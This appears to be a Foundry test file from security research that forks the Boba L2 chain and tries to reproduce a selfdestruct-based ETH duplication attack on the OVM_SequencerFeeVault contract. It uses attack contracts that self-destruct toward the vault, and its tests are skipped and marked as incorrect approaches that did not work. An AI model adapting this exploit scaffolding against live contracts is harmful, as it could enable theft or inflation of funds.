// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./boba__bobascan__common.sol";

contract Suicide_Attack_1 is BobaBobascanCommon {
    IOVM_SequencerFeeVault victim;

    constructor(IOVM_SequencerFeeVault _victim) {
        victim = IOVM_SequencerFeeVault(_victim);
    }

    function attack() public payable {
        emit log_named_decimal_uint(
            "[Start] Suicide_Attack_1 ETH balance",
            address(this).balance,
            18
        );

        // Cast address to payable
        address payable addr = payable(address(victim));
        selfdestruct(addr);
        // payable(address(victim)).transfer(address(this).balance);
        // payable(address(this)).transfer(address(victim).balance);

        emit log_named_decimal_uint(
            "[End] Suicide_Attack_1 ETH balance",
            address(this).balance,
            18
        );
    }
}

contract Suicide_Attack_2 is BobaBobascanCommon {
    IOVM_SequencerFeeVault victim;

    constructor(IOVM_SequencerFeeVault _victim) {
        victim = IOVM_SequencerFeeVault(_victim);
    }

    function destroy() public {
        emit log_named_decimal_uint(
            "[Start] Suicide_Attack_2 ETH balance",
            address(this).balance,
            18
        );

        selfdestruct(payable(address(this)));
    }

    function take() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract boba_bobascan_Basic_L2_Test is BobaBobascanCommon {
    using SafeMath for uint256;

    function setUp() public override {
        super.setUp();

        cheats.createSelectFork("boba_read", 1020646);

        // Pre-load tokens
        // writeTokenBalance(address(this), fl_token, payback_fee_amount);
    }

    // ----------------------------------------------------------------------------
    // Withdrawal
    // ----------------------------------------------------------------------------
    function skip_test__finalizeERC20Withdrawal__incorrect_approach() public {
        // cheats.expectRevert("xDomainMessageSender is not set");

        // // Impersonate as Proxy_OVM_L1CrossDomainMessenger
        // cheats.prank(address(Proxy_OVM_L1CrossDomainMessenger));

        OVM_SequencerFeeVault.withdraw();
    }

    // ----------------------------------------------------------------------------
    // Suicide - Failed due to Foundry has limitation on selfdestruct
    // ----------------------------------------------------------------------------
    function skip_test__suicide_1__incorrect_approach() public {
        emit log_named_decimal_uint(
            "[Start] OVM_SequencerFeeVault ETH balance",
            address(OVM_SequencerFeeVault).balance,
            18
        );

        emit log_named_decimal_uint(
            "[Start] Attacker ETH balance",
            address(this).balance,
            18
        );

        // Attack
        Suicide_Attack_1 attackContract = new Suicide_Attack_1(OVM_SequencerFeeVault);
        cheats.label(address(attackContract), "AttackContract");
        attackContract.attack();
        emit log_string("[Pass] Attacker destructed the Attack Contract");

        cheats.roll(block.number + 1);

        emit log_named_decimal_uint(
            "[End] Suicide_Attack_1 ETH balance",
            address(attackContract).balance,
            18
        );

        // payable(address(this)).transfer(address(attackContract).balance);

        emit log_named_decimal_uint(
            "[End] OVM_SequencerFeeVault ETH balance",
            address(OVM_SequencerFeeVault).balance,
            18
        );

        emit log_named_decimal_uint(
            "[End] Attacker ETH balance",
            address(this).balance,
            18
        );

    }

    // Reference: https://www.saurik.com/optimism.html
    function skip_test__suicide_2__incorrect_approach() public {
        emit log_named_decimal_uint(
            "[Start] OVM_SequencerFeeVault ETH balance",
            address(OVM_SequencerFeeVault).balance,
            18
        );

        emit log_named_decimal_uint(
            "[Start] Attacker ETH balance",
            address(this).balance,
            18
        );

        // Attack
        Suicide_Attack_2 attackContract = new Suicide_Attack_2(OVM_SequencerFeeVault);
        cheats.label(address(attackContract), "AttackContract");

        uint count=2;
        for (; count != 0; --count)
            attackContract.destroy();
            emit log_string("[Pass] Attacker destructed the Attack Contract");
        attackContract.take();
        payable(msg.sender).transfer(address(this).balance);

        cheats.roll(block.number + 1);

        emit log_named_decimal_uint(
            "[End] Suicide_Attack_1 ETH balance",
            address(attackContract).balance,
            18
        );

        // payable(address(this)).transfer(address(attackContract).balance);

        emit log_named_decimal_uint(
            "[End] OVM_SequencerFeeVault ETH balance",
            address(OVM_SequencerFeeVault).balance,
            18
        );

        emit log_named_decimal_uint(
            "[End] Attacker ETH balance",
            address(this).balance,
            18
        );

    }

    // ----------------------------------------------------------------------------
    // Fallback
    // ----------------------------------------------------------------------------
    receive() external payable {}
}